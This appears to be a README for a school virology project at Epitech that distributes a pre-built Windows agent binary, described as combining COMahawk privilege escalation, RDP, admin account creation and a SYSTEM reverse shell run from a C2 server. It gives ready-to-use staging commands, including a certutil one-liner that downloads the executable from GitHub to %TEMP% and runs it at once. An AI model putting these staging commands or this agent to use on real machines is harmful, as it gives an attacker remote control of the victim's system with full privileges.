# virology-binary school project in Epitech

Pre-built agent binaries, updated automatically by CI.

## Quick Download

```
curl -Lo virologie-agent.exe https://raw.githubusercontent.com/GrimalDev/virology-binary/main/virologie-agent.exe
```

## Files

| File                  | Description                                        |
| --------------------- | -------------------------------------------------- |
| `virologie-agent.exe` | COMahawk privesc + RDP + admin + revshell (SYSTEM) |

## Staging

Use the C2 server `stage` command for ready-made one-liners. Quick reference below.

### Direct download

```
certutil -urlcache -split -f https://raw.githubusercontent.com/GrimalDev/virology-binary/main/virologie-agent.exe %TEMP%\agent.exe && %TEMP%\agent.exe
```
